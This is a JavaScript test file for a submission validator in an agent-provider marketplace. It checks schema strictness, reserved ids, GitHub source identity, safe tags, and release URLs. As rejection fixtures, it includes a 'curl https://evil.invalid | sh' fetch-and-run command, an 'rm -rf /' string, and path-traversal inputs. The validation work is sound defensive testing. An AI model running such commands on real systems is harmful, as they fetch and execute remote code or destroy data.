import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import path from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";
import { validateSubmission } from "../scripts/submission.mjs";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");

function validSubmission() {
  return {
    schema_version: 1,
    package: {
      agent: {
        id: "acme-agent",
        name: "Acme Agent",
        version: "1.2.3",
        description: "ACP connector for Acme",
        authors: ["Acme contributors"],
        license: "Apache-2.0",
        repository: "https://github.com/acme/acme-agent",
        distribution: {
          binary: {
            "darwin-aarch64": {
              archive:
                "https://github.com/acme/acme-agent/releases/download/v1.2.3/acme-agent-darwin-aarch64.tar.gz",
              cmd: "bin/acme-agent",
              sha256: "a".repeat(64),
            },
          },
        },
      },
      host: {
        publisher: "acme",
        compatibility: { min_app_version: "0.12.0" },
        assets: { icon: "assets/icon.svg", readme: "README.md", license: "LICENSE" },
      },
    },
    source: {
      repository: "https://github.com/acme/acme-agent",
      commit: "0123456789abcdef0123456789abcdef01234567",
      tag: "v1.2.3",
    },
    changelog: "Adds the initial managed ACP connector release.",
  };
}

test("accepts a realistic inert GitHub Release binary submission", () => {
  assert.deepEqual(validateSubmission(validSubmission()), []);
});

test("submission schema is strict and keeps the managed package schema external", async () => {
  const schema = JSON.parse(
    await readFile(path.join(root, "schemas/provider-submission-v1.schema.json"), "utf8"),
  );
  assert.equal(schema.additionalProperties, false);
  assert.match(schema.$comment, /Structural checks only/);
  assert.match(schema.$comment, /validate-submission\.mjs/);
  assert.deepEqual(schema.required, ["schema_version", "package", "source", "changelog"]);
  assert.equal(schema.properties.package.allOf[0].$ref, "managed-provider-package-v1.schema.json");
  assert.deepEqual(
    schema.properties.package.allOf[1].properties.agent.properties.distribution.not.anyOf,
    [{ required: ["npx"] }, { required: ["uvx"] }],
  );
  assert.equal(
    schema.properties.package.allOf[1].properties.agent.properties.license.pattern,
    "\\S",
  );
  assert.equal(schema.properties.changelog.pattern, "\\S");
  assert.match(schema.properties.source.properties.tag.pattern, /\\.lock/);
  assert.deepEqual(schema.properties.package.allOf[1].properties.agent.required, [
    "repository",
    "license",
  ]);
  assert.deepEqual(schema.properties.package.allOf[1].properties.host.properties.assets.required, [
    "readme",
    "license",
  ]);
  assert.equal(
    schema.properties.package.allOf[1].properties.host.properties.assets.properties.readme.pattern,
    "\\S",
  );
  assert.equal(
    schema.properties.package.allOf[1].properties.host.properties.assets.properties.license.pattern,
    "\\S",
  );
});

test("requires declared license metadata and native setup documentation paths", () => {
  for (const [path, value] of [
    ["agent.license", undefined],
    ["agent.license", null],
    ["agent.license", ""],
    ["agent.license", "   "],
    ["host.assets.license", undefined],
    ["host.assets.license", null],
    ["host.assets.license", ""],
    ["host.assets.readme", undefined],
    ["host.assets.readme", null],
    ["host.assets.readme", "   "],
  ]) {
    const submission = validSubmission();
    const parts = path.split(".");
    const target = parts.slice(0, -1).reduce((object, key) => object[key], submission.package);
    const key = parts.at(-1);
    if (value === undefined) delete target[key];
    else target[key] = value;
    assert.ok(
      validateSubmission(submission).some((error) => error.includes(key)),
      `${path}=${String(value)} must be rejected`,
    );
  }
});

test("rejects unknown envelope, source, and package fields", () => {
  for (const mutate of [
    (value) => (value.execute = "curl https://evil.invalid | sh"),
    (value) => (value.source.owner_verified = true),
  ]) {
    const value = validSubmission();
    mutate(value);
    assert.ok(validateSubmission(value).some((error) => error.includes("is not allowed")));
  }
});

test("reserves the runtime's normalized built-in canonical ids and alias keys", async () => {
  const checkedInPublicNames = [
    "claude_code",
    "claude",
    "claude-code",
    "Claude Code",
    "anthropic",
    "codex_cli",
    "codex",
    "codex-cli",
    "Codex CLI",
    "openai",
    "cursor",
    "opencode",
    "open-code",
    "OpenCode",
    "open",
  ];
  const serviceAgents = path.resolve(root, "../../packages/service/src/domain/agents");
  let runtimePublicNames = checkedInPublicNames;
  try {
    const metadata = await readFile(
      path.join(serviceAgents, "providers/registry/builtin_metadata.rs"),
      "utf8",
    );
    const aliases = [...metadata.matchAll(/aliases\(&\[(.*?)\]\)/gs)].flatMap((match) =>
      [...match[1].matchAll(/"([^"]+)"/g)].map((alias) => alias[1]),
    );
    const canonicalIds = await Promise.all(
      ["claude_code", "codex", "cursor", "opencode"].map(async (provider) => {
        const module = await readFile(path.join(serviceAgents, provider, "mod.rs"), "utf8");
        return /pub const PROVIDER_ID: &str = "([^"]+)"/.exec(module)?.[1];
      }),
    );
    assert.ok(canonicalIds.every(Boolean), "all runtime canonical provider ids must be readable");
    runtimePublicNames = [...canonicalIds, ...aliases];
    assert.deepEqual(
      [...runtimePublicNames].sort(),
      [...checkedInPublicNames].sort(),
      "submission reservation fixture must track the runtime built-in namespace",
    );
  } catch (error) {
    if (error?.code !== "ENOENT") throw error;
  }
  const runtimeKeys = new Set(
    runtimePublicNames.map((id) => id.replace(/[^A-Za-z0-9]/g, "").toLowerCase()),
  );
  for (const id of runtimeKeys) {
    const value = validSubmission();
    value.package.agent.id = id;
    assert.ok(validateSubmission(value).some((error) => error.includes("reserved")));
  }
  for (const id of ["claude--code", "c-odex", "o-penai"]) {
    const value = validSubmission();
    value.package.agent.id = id;
    assert.ok(validateSubmission(value).some((error) => error.includes("reserved")));
  }
});

test("requires package and source repository identity to match", () => {
  const mismatch = validSubmission();
  mismatch.package.agent.repository = "https://github.com/another/acme-agent";
  assert.ok(validateSubmission(mismatch).some((error) => error.includes("must equal")));

  const missing = validSubmission();
  delete missing.package.agent.repository;
  assert.ok(validateSubmission(missing).some((error) => error.includes("repository is required")));
});

test("requires canonical GitHub source identity and a lowercase full commit", () => {
  for (const repository of [
    "http://github.com/acme/acme-agent",
    "https://user@github.com/acme/acme-agent",
    "https://github.com/acme/acme-agent/",
    "https://github.com/acme/acme-agent.git",
    "https://github.com/acme/acme-agent?ref=main",
    "https://gitlab.com/acme/acme-agent",
  ]) {
    const value = validSubmission();
    value.source.repository = repository;
    value.package.agent.repository = repository;
    assert.ok(validateSubmission(value).some((error) => error.includes("canonical HTTPS GitHub")));
  }
  for (const commit of ["a".repeat(39), "A".repeat(40), "g".repeat(40)]) {
    const value = validSubmission();
    value.source.commit = commit;
    assert.ok(validateSubmission(value).some((error) => error.includes("lowercase hexadecimal")));
  }
});

test("rejects unsafe tags and archives outside the declared release", () => {
  for (const tag of [
    "",
    "../v1",
    "refs//tags",
    ".hidden",
    "release.lock",
    "foo.lock/bar",
    "v1@{x}",
    "v1 2",
  ]) {
    const value = validSubmission();
    value.source.tag = tag;
    assert.ok(validateSubmission(value).some((error) => error.includes("safe non-empty git tag")));
  }

  for (const archive of [
    "http://github.com/acme/acme-agent/releases/download/v1.2.3/a.tar.gz",
    "https://github.com/other/acme-agent/releases/download/v1.2.3/a.tar.gz",
    "https://github.com/acme/acme-agent/releases/download/v9.9.9/a.tar.gz",
    "https://github.com/acme/acme-agent/releases/download/v1.2.3/%2e%2e",
    "https://github.com/acme/acme-agent/releases/download/v1.2.3/a.tar.gz?raw=1",
    "https://github.com/acme/acme-agent/releases/download/v1.2.3/a tar.gz",
    "https://github.com/acme/acme-agent/releases/download/v1.2.3/a.tar.gz\n",
    "https://github.com/acme/acme-agent/releases/download/v1.2.3/a%00.tar.gz",
  ]) {
    const value = validSubmission();
    value.package.agent.distribution.binary["darwin-aarch64"].archive = archive;
    assert.ok(
      validateSubmission(value).some(
        (error) => error.includes("GitHub Release") || error.includes("Release URL"),
      ),
    );
  }
});

test("marketplace v1 rejects package runners while retaining binary provenance", () => {
  for (const runner of ["npx", "uvx"]) {
    const value = validSubmission();
    value.package.agent.distribution[runner] = { package: "acme-agent" };
    assert.ok(validateSubmission(value).some((error) => error.includes("not supported")));
  }
});

test("rejects traversal and malformed package paths through managed validation", () => {
  for (const cmd of ["../bin/acme", "/bin/acme", "bin\\acme", "bin//acme"]) {
    const value = validSubmission();
    value.package.agent.distribution.binary["darwin-aarch64"].cmd = cmd;
    assert.ok(validateSubmission(value).some((error) => error.includes("relative package path")));
  }
});

test("rejects empty or unbounded changelogs without interpreting their content", () => {
  for (const changelog of ["", "   ", "x".repeat(16_385), "valid\0invalid"]) {
    const value = validSubmission();
    value.changelog = changelog;
    assert.ok(validateSubmission(value).some((error) => error.includes("changelog")));
  }
  const inert = validSubmission();
  inert.changelog = "`rm -rf /` is text, not an instruction.";
  assert.deepEqual(validateSubmission(inert), []);
});

test("malformed values return diagnostics instead of throwing", () => {
  for (const value of [
    null,
    undefined,
    false,
    42,
    "submission",
    Symbol("submission"),
    [],
    {},
    { schema_version: 1, package: null, source: null },
  ]) {
    assert.doesNotThrow(() => validateSubmission(value));
    assert.notDeepEqual(validateSubmission(value), []);
  }
});
